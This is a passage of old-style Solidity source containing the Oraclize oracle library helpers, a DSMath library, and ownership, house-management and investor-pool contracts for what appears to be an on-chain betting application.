dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_setConfig(bytes32 config) oraclizeAPI internal {\n return oraclize.setConfig(config);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n if (_b > 0) mint *= 10**_b;\n return mint;\n }\n function uint2str(uint i) internal returns (string){\n if (i == 0) return \"0\";\n uint j = i;\n uint len;\n while (j != 0){\n len++;\n j /= 10;\n }\n bytes memory bstr = new bytes(len);\n uint k = len - 1;\n while (i != 0){\n bstr[k--] = byte(48 + i % 10);\n i /= 10;\n }\n return string(bstr);\n }\n function stra2cbor(string[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n function ba2cbor(bytes[] arr) internal returns (bytes) {\n uint arrlen = arr.length;\n uint outputlen = 0;\n bytes[] memory elemArray = new bytes[](arrlen);\n for (uint i = 0; i < arrlen; i++) {\n elemArray[i] = (bytes(arr[i]));\n outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3;\n }\n uint ctr = 0;\n uint cborlen = arrlen + 0x80;\n outputlen += byte(cborlen).length;\n bytes memory res = new bytes(outputlen);\n while (byte(cborlen).length > ctr) {\n res[ctr] = byte(cborlen)[ctr];\n ctr++;\n }\n for (i = 0; i < arrlen; i++) {\n res[ctr] = 0x5F;\n ctr++;\n for (uint x = 0; x < elemArray[i].length; x++) {\n if (x % 23 == 0) {\n uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;\n elemcborlen += 0x40;\n uint lctr = ctr;\n while (byte(elemcborlen).length > ctr - lctr) {\n res[ctr] = byte(elemcborlen)[ctr - lctr];\n ctr++;\n }\n }\n res[ctr] = elemArray[i][x];\n ctr++;\n }\n res[ctr] = 0xFF;\n ctr++;\n }\n return res;\n }\n string oraclize_network_name;\n function oraclize_setNetworkName(string _network_name) internal {\n oraclize_network_name = _network_name;\n }\n function oraclize_getNetworkName() internal returns (string) {\n return oraclize_network_name;\n }\n function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){\n if ((_nbytes == 0)||(_nbytes > 32)) throw;\n bytes memory nbytes = new bytes(1);\n nbytes[0] = byte(_nbytes);\n bytes memory unonce = new bytes(32);\n bytes memory sessionKeyHash = new bytes(32);\n bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();\n assembly {\n mstore(unonce, 0x20)\n mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))\n mstore(sessionKeyHash, 0x20)\n mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)\n }\n bytes[3] memory args = [unonce, nbytes, sessionKeyHash];\n bytes32 queryId = oraclize_query(_delay, \"random\", args, _customGasLimit);\n oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));\n return queryId;\n }\n function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {\n oraclize_randomDS_args[queryId] = commitment;\n }\n mapping(bytes32=>bytes32) oraclize_randomDS_args;\n mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;\n function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){\n bool sigok;\n address signer;\n bytes32 sigr;\n bytes32 sigs;\n bytes memory sigr_ = new bytes(32);\n uint offset = 4+(uint(dersig[3]) - 0x20);\n sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);\n bytes memory sigs_ = new bytes(32);\n offset += 32 + 2;\n sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);\n assembly {\n sigr := mload(add(sigr_, 32))\n sigs := mload(add(sigs_, 32))\n }\n (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);\n if (address(sha3(pubkey)) == signer) return true;\n else {\n (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);\n return (address(sha3(pubkey)) == signer);\n }\n }\n function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {\n bool sigok;\n bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);\n copyBytes(proof, sig2offset, sig2.length, sig2, 0);\n bytes memory appkey1_pubkey = new bytes(64);\n copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);\n bytes memory tosign2 = new bytes(1+65+32);\n tosign2[0] = 1;\n copyBytes(proof, sig2offset-65, 65, tosign2, 1);\n bytes memory CODEHASH = hex\"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c\";\n copyBytes(CODEHASH, 0, 32, tosign2, 1+65);\n sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);\n if (sigok == false) return false;\n bytes memory LEDGERKEY = hex\"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4\";\n bytes memory tosign3 = new bytes(1+65);\n tosign3[0] = 0xFE;\n copyBytes(proof, 3, 65, tosign3, 1);\n bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);\n copyBytes(proof, 3+65, sig3.length, sig3, 0);\n sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);\n return sigok;\n }\n modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {\n if ((_proof[0] != \"L\")||(_proof[1] != \"P\")||(_proof[2] != 1)) throw;\n bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());\n if (proofVerified == false) throw;\n _;\n }\n function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){\n bool match_ = true;\n for (var i=0; i<prefix.length; i++){\n if (content[i] != prefix[i]) match_ = false;\n }\n return match_;\n }\n function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){\n bool checkok;\n uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;\n bytes memory keyhash = new bytes(32);\n copyBytes(proof, ledgerProofLength, 32, keyhash, 0);\n checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));\n if (checkok == false) return false;\n bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);\n copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);\n checkok = matchBytes32Prefix(sha256(sig1), result);\n if (checkok == false) return false;\n bytes memory commitmentSlice1 = new bytes(8+1+32);\n copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);\n bytes memory sessionPubkey = new bytes(64);\n uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;\n copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);\n bytes32 sessionPubkeyHash = sha256(sessionPubkey);\n if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){\n delete oraclize_randomDS_args[queryId];\n } else return false;\n bytes memory tosign1 = new bytes(32+8+1+32);\n copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);\n checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);\n if (checkok == false) return false;\n if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){\n oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);\n }\n return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];\n }\n function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {\n uint minLength = length + toOffset;\n if (to.length < minLength) {\n throw;\n }\n uint i = 32 + fromOffset;\n uint j = 32 + toOffset;\n while (i < (32 + fromOffset + length)) {\n assembly {\n let tmp := mload(add(from, i))\n mstore(add(to, j), tmp)\n }\n i += 32;\n j += 32;\n }\n return to;\n }\n function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {\n bool ret;\n address addr;\n assembly {\n let size := mload(0x40)\n mstore(size, hash)\n mstore(add(size, 32), v)\n mstore(add(size, 64), r)\n mstore(add(size, 96), s)\n ret := call(3000, 1, 0, size, 128, size, 32)\n addr := mload(size)\n }\n return (ret, addr);\n }\n function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65)\n return (false, 0);\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27)\n v += 27;\n if (v != 27 && v != 28)\n return (false, 0);\n return safer_ecrecover(hash, v, r, s);\n }\n}\npragma solidity ^0.4.10;\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x * y;\n assert(x == 0 || z / x == y);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract LedgerProofVerifyI {\n function external_oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) public;\n function external_oraclize_randomDS_proofVerify(bytes proof, bytes32 queryId, bytes result, string context_name) public returns (bool);\n}\ncontract Owned {\n address public owner;\n modifier onlyOwner {\n assert(msg.sender == owner);\n _;\n }\n function Owned() {\n owner = msg.sender;\n }\n}\ncontract oraclizeSettings is Owned {\n uint constant ORACLIZE_PER_SPIN_GAS_LIMIT = 6100;\n uint constant ORACLIZE_BASE_GAS_LIMIT = 220000;\n uint safeGas = 9000;\n event LOG_newGasLimit(uint _gasLimit);\n function setSafeGas(uint _gas)\n onlyOwner\n {\n assert(ORACLIZE_BASE_GAS_LIMIT + _gas >= ORACLIZE_BASE_GAS_LIMIT);\n assert(_gas <= 25000);\n assert(_gas >= 9000);\n safeGas = _gas;\n LOG_newGasLimit(_gas);\n }\n}\ncontract HouseManaged is Owned {\n address public houseAddress;\n address newOwner;\n bool public isStopped;\n event LOG_ContractStopped();\n event LOG_ContractResumed();\n event LOG_OwnerAddressChanged(address oldAddr, address newOwnerAddress);\n event LOG_HouseAddressChanged(address oldAddr, address newHouseAddress);\n modifier onlyIfNotStopped {\n assert(!isStopped);\n _;\n }\n modifier onlyIfStopped {\n assert(isStopped);\n _;\n }\n function HouseManaged() {\n houseAddress = msg.sender;\n }\n function stop_or_resume_Contract(bool _isStopped)\n onlyOwner {\n isStopped = _isStopped;\n }\n function changeHouse(address _newHouse)\n onlyOwner {\n assert(_newHouse != address(0x0));\n houseAddress = _newHouse;\n LOG_HouseAddressChanged(houseAddress, _newHouse);\n }\n function changeOwner(address _newOwner) onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() {\n if (msg.sender == newOwner) {\n owner = newOwner;\n LOG_OwnerAddressChanged(owner, newOwner);\n delete newOwner;\n }\n }\n}\ncontract usingInvestorsModule is HouseManaged, oraclizeSettings {\n uint constant MAX_INVESTORS = 5;\n uint constant divestFee = 50;\n struct Investor {\n address investorAddress;\n uint amountInvested;\n bool votedForEmergencyWithdrawal;\n }\n mapping(address => uint) public investorIDs;\n mapping(uint => Investor) public investors;\n uint public numInvestors = 0;\n uint public invested = 0;\n uint public investorsProfit = 0;\n uint public investorsLosses = 0;\n bool profitDistributed;\n event LOG_InvestorEntrance(address indexed investor, uint amount);\n event LOG_InvestorCapitalUpdate(address indexed investor, int amount);\n event LOG_InvestorExit(address indexed investor, uint amount);\n event LOG_EmergencyAutoStop();\n event LOG_ZeroSend();\n event LOG_ValueIsTooBig();\n event LOG_FailedSend(address addr, uint value);\n event LOG_SuccessfulSend(address addr, uint value);\n modifier onlyMoreThanMinInvestment {\n assert(msg.value > getMinInvestment());\n _;\n }\n modifier onlyMoreThanZero {\n assert(msg.value != 0);\n _;\n }\n modifier onlyInvestors {\n assert(investorIDs[msg.sender] != 0);\n _;\n }\n modifier onlyNotInvestors {\n assert(investorIDs[msg.sender] == 0);\n _;\n }\n modifier investorsInvariant {\n _;\n assert(numInvestors <= MAX_INVESTORS);\n }\n function getBankroll()\n constant\n returns(uint) {\n if ((invested < investorsProfit) ||\n (invested + investorsProfit < invested) ||\n (invested + investorsProfit < investorsLosses)) {\n return 0;\n }\n else {\n return invested + investorsProfit - investorsLosses;\n }\n }\n function getMinInvestment()\n constant\n returns(uint) {\n if (numInvestors == MAX_INVESTORS) {\n uint investorID = searchSmallestInvestor();\n return getBalance(investors[investorID].investorAddress);\n }\n else {\n return 0;\n }\n }\n function getLossesShare(address currentInvestor)\n constant\n returns (uint) {\n return (investors[investorIDs[currentInvestor]].amountInvested * investorsLosses) / invested;\n }\n function getProfitShare(address currentInvestor)\n constant\n returns (uint) {\n return (investors[investorIDs[currentInvestor]].amountInvested * investorsProfit) / invested;\n }\n function getBalance(address currentInvestor)\n constant\n returns (uint) {\n uint invested = investors[investorIDs[currentInvestor]].amountInvested;\n uint profit = getProfitShare(currentInvestor);\n uint losses = getLossesShare(currentInvestor);\n if ((invested + profit < profit) ||\n (invested + profit < invested) ||\n (invested + profit < losses))\n return 0;\n else\n return invested + profit - losses;\n }\n function searchSmallestInvestor()\n constant\n returns(uint) {\n uint investorID = 1;\n for (uint i = 1; i <= numInvestors; i++) {\n if (getBalance(investors[i].investorAddress) < getBalance(investors[investorID].investorAddress)) {\n investorID = i;\n }\n }\n return investorID;\n }\n function addInvestorAtID(uint id)\n private {\n investorIDs[msg.sender] = id;\n investors[id].investorAddress = msg.sender;\n investors[id].amountInvested = msg.value;\n invested += msg.value;\n LOG_InvestorEntrance(msg.sender, msg.value);\n }\n function profitDistribution()\n private {\n if (profitDistributed) return;\n uint copyInvested;\n for (uint i = 1; i <= numInvestors; i++) {\n address currentInvestor = investors[i].investorAddress;\n uint profitOfInvestor = getProfitShare(currentInvestor);\n uint lossesOfInvestor = getLossesShare(currentInvestor);\n if ((investors[i].amountInvested + profitOfInvestor >= investors[i].amountInvested) &&\n (investors[i].amountInvested + profitOfInvestor >= lossesOfInvestor)) {\n investors[i].amountInvested += profitOfInvestor - lossesOfInvestor;\n LOG_InvestorCapitalUpdate(currentInvestor, (int) (profitOfInvestor - lossesOfInvestor));\n }\n else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n copyInvested += investors[i].amountInvested;\n }\n delete investorsProfit;\n delete investorsLosses;\n invested = copyInvested;\n profitDistributed = true;\n }\n function increaseInvestment()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyInvestors {\n profitDistribution();\n investors[investorIDs[msg.sender]].amountInvested += msg.value;\n invested += msg.value;\n }\n function newInvestor()\n payable\n onlyIfNotStopped\n onlyMoreThanZero\n onlyNotInvestors\n onlyMoreThanMinInvestment\n investorsInvariant {\n profitDistribution();\n if (numInvestors == MAX_INVESTORS) {\n uint smallestInvestorID = searchSmallestInvestor();\n divest(investors[smallestInvestorID].investorAddress);\n }\n numInvestors++;\n addInvestorAtID(numInvestors);\n }\n function divest()\n onlyInvestors {\n divest(msg.sender);\n }\n function divest(address currentInvestor)\n internal\n investorsInvariant {\n profitDistribution();\n uint currentID = investorIDs[currentInvestor];\n uint amountToReturn = getBalance(currentInvestor);\n if (invested >= investors[currentID].amountInvested) {\n invested -= investors[currentID].amountInvested;\n uint divestFeeAmount = (amountToReturn*divestFee)/10000;\n amountToReturn -= divestFeeAmount;\n delete investors[currentID];\n delete investorIDs[currentInvestor];\n if (currentID != numInvestors) {\n Investor lastInvestor = investors[numInvestors];\n investorIDs[lastInvestor.investorAddress] = currentID;\n investors[currentID] = lastInvestor;\n delete investors[numInvestors];\n }\n numInvestors--;\n safeSend(currentInvestor, amountToReturn);\n safeSend(houseAddress, divestFeeAmount);\n LOG_InvestorExit(currentInvestor, amountToReturn);\n } else {\n isStopped = true;\n LOG_EmergencyAutoStop();\n }\n }\n function forceDivestOfAllInvestors()\n onlyOwner {\n uint copyNumInvestors = numInvestors;\n for (uint i = 1; i <= copyNumInvestors; i++) {\n divest(investors[1].investorAddress);\n }\n }\n function safeSend(address addr, uint value)\n internal {\n if (value == 0) {\n LOG_ZeroSend();\n return;\n }\n if (this.balance < value) {\n LOG_ValueIsTooBig();\n return;\n }\n if (!(addr.call.gas(safeGas).value(value)())) {\n LOG_FailedSend(addr, value);\n if (addr != houseAddress) {\n if (!(houseAddress.call.gas(safeGas).value(value)())) LOG_FailedSend(houseAddress, value);\n }\n }\n LOG_SuccessfulSend(addr,value);\n }\n}\ncontract EmergencyWithdrawalModule is usingInvestorsModule {\n uint constant EMERGENCY_WITHDRAWAL_RATIO = 80;\n uint constant EMERGENCY_TIMEOUT = 3 days;\n struct WithdrawalProposal {\n address toAddress;\n uint atTime;\n }\n WithdrawalProposal public proposedWithdrawal;\n event LOG_EmergencyWithdrawalProposed();\n event LOG_EmergencyWithdrawalFailed(address indexed withdrawalAddress);\n event LOG_EmergencyWithdrawalSucceeded(address indexed withdrawalAddress, uint amountWithdrawn);\n event LOG_EmergencyWithdrawalVote(address indexed investor, bool vote);\n modifier onlyAfterProposed {\n assert(proposedWithdrawal.toAddress != 0);\n _;\n }\n modifier onlyIfEmergencyTimeOutHasPassed {\n assert(proposedWithdrawal.atTime + EMERGENCY_TIMEOUT <= now);\n _;\n }\n function voteEmergencyWithdrawal(bool vote)\n onlyInvestors\n onlyAfterProposed\n onlyIfStopped {\n investors[investorIDs[msg.sender]].votedForEmergencyWithdrawal = vote;\n 